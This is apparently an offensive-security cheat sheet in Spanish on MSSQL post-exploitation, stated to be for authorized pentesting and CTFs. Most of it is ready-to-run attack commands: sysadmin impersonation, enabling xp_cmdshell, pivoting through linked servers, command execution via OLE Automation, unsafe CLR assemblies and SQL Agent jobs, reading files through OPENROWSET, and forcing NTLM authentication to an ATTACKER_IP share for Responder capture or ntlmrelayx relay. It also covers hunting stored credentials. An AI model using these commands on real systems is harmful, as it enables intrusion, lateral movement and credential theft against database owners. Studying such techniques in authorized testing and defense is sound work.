# MSSQL — Advanced Post-Exploitation

Guía completa de ataques avanzados desde MSSQL Server. Va más allá de xp_cmdshell — cubre linked servers, OLE Automation, CLR assemblies, SQL Agent, NTLM coercion, y escalación a AD.

**Contexto:** Uso en pentesting autorizado de AD, CTFs, y laboratorios de seguridad.

---

## Enumeración Inicial

### Información del servidor
```sql
-- Versión, usuario actual, rol
SELECT @@version;
SELECT SYSTEM_USER;  -- login (ej: domain\user)
SELECT USER_NAME();  -- database user
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 = sysadmin

-- Bases de datos accesibles
SELECT name FROM master.sys.databases;

-- Logins y sus roles
SELECT sp.name, sp.type_desc, sp.is_disabled,
       SUSER_SRVROLEMEMBER(sp.name, 'sysadmin') AS is_sysadmin
FROM sys.server_principals sp WHERE sp.type IN ('S','U','G');
```

### Impersonation (EXECUTE AS)
```sql
-- ¿Quién puede impersonar a quién?
SELECT grantee.name AS quien_puede, grantor.name AS a_quien,
       perm.permission_name, perm.state_desc
FROM sys.server_permissions perm
JOIN sys.server_principals grantee ON perm.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals grantor ON perm.grantor_principal_id = grantor.principal_id
WHERE perm.type = 'IM';

-- Impersonar y ejecutar como otro login
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

Si puedes impersonar a `sa` o cualquier sysadmin, tienes control total.

---

## Linked Servers — Pivoting entre SQL Servers

Los linked servers permiten ejecutar queries en otros SQL Servers. Son el mecanismo principal de lateral movement en entornos MSSQL.

### Enumeración
```sql
-- Listar linked servers
SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;

-- Ver mapeo de logins (quién autentica como quién)
SELECT ss.name AS linked_server, sll.local_principal_id,
       sp.name AS local_login, sll.remote_name
FROM sys.linked_logins sll
JOIN sys.servers ss ON sll.server_id = ss.server_id
LEFT JOIN sys.server_principals sp ON sll.local_principal_id = sp.principal_id;

-- Probar conectividad
EXEC ('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LinkedServerName];
```

### Ejecución remota via linked server
```sql
-- Query simple
EXEC ('SELECT @@version') AT [LinkedServerName];

-- Habilitar xp_cmdshell en el linked server (si eres sysadmin allá)
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];

-- Ejecutar comandos OS en el linked server
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServerName];

-- Cadena de linked servers (doble hop)
EXEC ('EXEC (''SELECT @@servername'') AT [ThirdServer]') AT [SecondServer];
```

### Escaping de comillas en cadenas anidadas
Cada nivel de `EXEC AT` requiere duplicar las comillas simples:
- Nivel 1: `'texto'` → `''texto''`
- Nivel 2: `''texto''` → `''''texto''''`

Para comandos complejos, usar **PowerShell EncodedCommand** evita problemas de escaping:
```python
# Python helper para generar encoded commands
import base64
ps_code = 'whoami /all'
encoded = base64.b64encode(ps_code.encode('utf-16-le')).decode()
# Usar: powershell -EncodedCommand <encoded>
```

---

## xp_cmdshell — Ejecución de Comandos OS

### Habilitación (requiere sysadmin)
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Ejecución
```sql
EXEC xp_cmdshell 'whoami /all';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user /domain';
```

El proceso cmd.exe hereda el token del service account de SQL Server. Verificar privilegios:
```sql
EXEC xp_cmdshell 'whoami /priv';
-- SeImpersonatePrivilege → potato attacks posibles
-- Solo SeChangeNotifyPrivilege → escalación limitada
```

---

## OLE Automation — Ejecución via COM Objects

Alternativa a xp_cmdshell usando COM objects. Útil cuando xp_cmdshell está deshabilitado pero OLE Automation está habilitado.

### Habilitación (requiere sysadmin)
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

### WScript.Shell — Ejecutar comandos
```sql
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUT;
DECLARE @rt INT;
EXEC sp_OAMethod @shell, 'Run', @rt OUT, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt', 0, True;
EXEC sp_OADestroy @shell;
-- Leer resultado
EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';
```

### Scripting.FileSystemObject — Escribir archivos
```sql
DECLARE @fso INT, @file INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUT;
EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUT, 'C:\Windows\Temp\payload.bat', True;
EXEC sp_OAMethod @file, 'Write', NULL, 'whoami > C:\Windows\Temp\result.txt';
EXEC sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @fso;
```

### ADSI via OLE — Interacción con Active Directory
```sql
-- Crear objeto ADsNameSpaces (verificar acceso ADSI)
DECLARE @adsi INT;
EXEC sp_OACreate 'ADsNameSpaces', @adsi OUT;
-- Si retorna handle válido, puedes interactuar con AD via ADSI COM
EXEC sp_OADestroy @adsi;
```

OLE Automation ejecuta en el mismo contexto que xp_cmdshell (service account de SQL Server). No provee escalación por sí solo, pero permite rutas alternativas cuando xp_cmdshell está bloqueado.

---

## CLR Assembly — Ejecución de Código .NET

Permite cargar y ejecutar assemblies .NET dentro del proceso de SQL Server. Más potente que xp_cmdshell porque el código corre in-process con acceso a APIs de .NET.

### Habilitación
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;

-- En SQL Server 2017+, CLR strict security bloquea assemblies sin firmar
-- Verificar:
SELECT name, value_in_use FROM sys.configurations WHERE name = 'clr strict security';
-- Si es 1, necesitas firmar el assembly o deshabilitar:
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
-- O marcar la DB como TRUSTWORTHY:
ALTER DATABASE master SET TRUSTWORTHY ON;
```

### Crear assembly desde hex
```sql
-- 1. Compilar un .NET assembly (C#) en tu máquina atacante
-- 2. Convertir el .dll a hex
-- 3. Cargar en SQL Server:
CREATE ASSEMBLY CmdExec
FROM 0x4D5A... -- hex del .dll
WITH PERMISSION_SET = UNSAFE;

-- 4. Crear stored procedure que llame al assembly
CREATE PROCEDURE [dbo].[CmdExec] @cmd NVARCHAR(4000)
AS EXTERNAL NAME [CmdExec].[StoredProcedures].[CmdExec];

-- 5. Ejecutar
EXEC CmdExec 'whoami';
```

**Casos de uso avanzados de CLR:**
- Token manipulation (robar tokens de otros procesos)
- Direct Win32 API calls (CreateProcessAsUser, etc.)
- LDAP modifications directas via System.DirectoryServices
- Kerberos ticket requests via System.IdentityModel

---

## SQL Agent Jobs — Ejecución Diferida

SQL Server Agent ejecuta jobs como su propia service account (a veces diferente del MSSQL service account). Si puedes crear jobs Y el Agent está corriendo, obtienes ejecución como otra cuenta.

### Enumeración
```sql
-- Listar jobs existentes
SELECT j.name, j.enabled, j.description, js.step_name, js.subsystem, js.command
FROM msdb.dbo.sysjobs j
JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id;

-- Estado del Agent
EXEC xp_cmdshell 'sc query SQLSERVERAGENT';

-- Cuenta del Agent
EXEC xp_cmdshell 'sc qc SQLSERVERAGENT';
```

### Crear y ejecutar job
```sql
-- Crear job
EXEC msdb.dbo.sp_add_job @job_name = N'PentestJob', @enabled = 1;

-- Agregar step (CmdExec = ejecución OS)
EXEC msdb.dbo.sp_add_jobstep
    @job_name = N'PentestJob',
    @step_name = N'Step1',
    @subsystem = N'CmdExec',
    @command = N'whoami /all > C:\Windows\Temp\agent_out.txt';

-- Asignar al servidor local
EXEC msdb.dbo.sp_add_jobserver @job_name = N'PentestJob', @server_name = N'(local)';

-- Ejecutar inmediatamente
EXEC msdb.dbo.sp_start_job @job_name = N'PentestJob';
```

**Limitación:** Si SQL Agent está parado y no puedes iniciarlo (`net start SQLSERVERAGENT` → access denied), los jobs no ejecutarán. Verificar permisos con `sc qc SQLSERVERAGENT` para ver la cuenta del servicio.

### Intentar iniciar Agent
```sql
-- Via xp_cmdshell
EXEC xp_cmdshell 'net start SQLSERVERAGENT';
-- Via sc
EXEC xp_cmdshell 'sc start SQLSERVERAGENT';
```

---

## OPENROWSET — Lectura de Archivos

### Leer archivos del disco
```sql
-- Leer archivo de texto completo
SELECT * FROM OPENROWSET(BULK 'C:\Windows\Temp\output.txt', SINGLE_CLOB) AS t;

-- Leer archivo binario
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_BLOB) AS t;

-- Via linked server
EXEC ('SELECT * FROM OPENROWSET(BULK ''C:\Users\Administrator\Desktop\root.txt'', SINGLE_CLOB) AS t;') AT [LinkedServer];
```

Requiere que el usuario tenga ADMINISTER BULK OPERATIONS privilege o sea sysadmin.

---

## NTLM Coercion via MSSQL

Forzar al SQL Server a autenticarse contra tu máquina para capturar hashes NTLMv2 o hacer relay.

### xp_dirtree (más confiable)
```sql
-- Fuerza autenticación SMB del service account
EXEC master..xp_dirtree '\\ATTACKER_IP\share';

-- Via linked server (fuerza auth del linked server's service account)
EXEC ('EXEC master..xp_dirtree ''\\ATTACKER_IP\share''') AT [LinkedServer];
```

### xp_fileexist
```sql
EXEC master..xp_fileexist '\\ATTACKER_IP\share\file';
```

### xp_subdirs
```sql
EXEC master..xp_subdirs '\\ATTACKER_IP\share';
```

**Workflow completo:**
```bash
# 1. En tu máquina atacante, iniciar Responder o ntlmrelayx
sudo responder -I eth0 -v
# O para relay:
ntlmrelayx.py -t ldap://DC_IP --delegate-access

# 2. Desde MSSQL, trigger la coerción
# → Responder captura hash NTLMv2 del service account
# → ntlmrelayx hace relay si signing está deshabilitado
```

**Nota:** Si el SQL Server usa una cuenta de dominio (no NT SERVICE), el hash capturado es del domain account y puede crackearse o relayearse.

---

## Extracción de Credenciales

### Linked server passwords
Las passwords de linked servers están cifradas en master DB. Con sysadmin puedes intentar:
```sql
-- Ver linked login mappings (passwords no visibles directamente)
SELECT * FROM master.sys.linked_logins;

-- Las passwords están en master.sys.syslnklgns (cifradas con service master key)
-- Para descifrarlas necesitas:
-- 1. Acceso al service master key (DPAPI)
-- 2. O dump de la DB master y descifrado offline
```

### Credenciales en jobs
```sql
-- Buscar passwords en comandos de jobs
SELECT js.command FROM msdb.dbo.sysjobsteps js
WHERE js.command LIKE '%password%' OR js.command LIKE '%pwd%';
```

### Credenciales en procedimientos almacenados
```sql
-- Buscar hardcoded credentials en stored procedures
SELECT OBJECT_NAME(object_id), definition
FROM sys.sql_modules
WHERE definition LIKE '%password%' OR definition LIKE '%pwd%';
```

---

## Decision Tree: MSSQL Post-Exploitation

```
¿Eres sysadmin?
    │
    SÍ → Habilitar xp_cmdshell → ejecutar whoami /priv
    │   │
    │   ├── ¿SeImpersonatePrivilege? → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)
    │   ├── ¿Linked servers? → Pivotar via EXEC AT → repetir en cada server
    │   ├── ¿SQL Agent corriendo? → Crear job CmdExec
    │   ├── ¿OLE Automation? → sp_OACreate WScript.Shell
    │   ├── ¿CLR habilitado? → Cargar assembly .NET
    │   └── Forzar NTLM coercion → xp_dirtree a tu máquina → capturar/relay hash
    │
    NO → ¿Puedes impersonar algún sysadmin?
        │
        SÍ → EXECUTE AS LOGIN = 'sa' → repetir desde arriba
        │
        NO → ¿Hay linked servers accesibles?
            │
            SÍ → ¿Eres sysadmin en el linked server? → pivotar
            │
            NO → Enumerar DB para credenciales, buscar en stored procedures,
                 intentar xp_dirtree coercion con tu usuario actual
```

---

## Tips

- **xp_cmdshell vs OLE vs CLR:** Los tres ejecutan como el service account de MSSQL. La diferencia es cómo ejecutan (proceso hijo vs COM vs in-process), no quién ejecuta.
- **Linked server chain:** Un linked server puede llevar a otro linked server. Enumera recursivamente.
- **PowerShell EncodedCommand:** Para comandos complejos via xp_cmdshell, usa base64 UTF-16LE para evitar problemas de escaping de comillas.
- **OPENROWSET para flags:** En CTFs, `SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;` es tu mejor amigo.
- **NTLM coercion estratégica:** xp_dirtree en un linked server fuerza auth del service account de ESE server, no del tuyo. Útil para capturar machine accounts de DCs.
- **SQL Agent cuenta diferente:** A veces el Agent corre como una cuenta con más privilegios que el MSSQL service. Verificar con `sc qc SQLSERVERAGENT`.
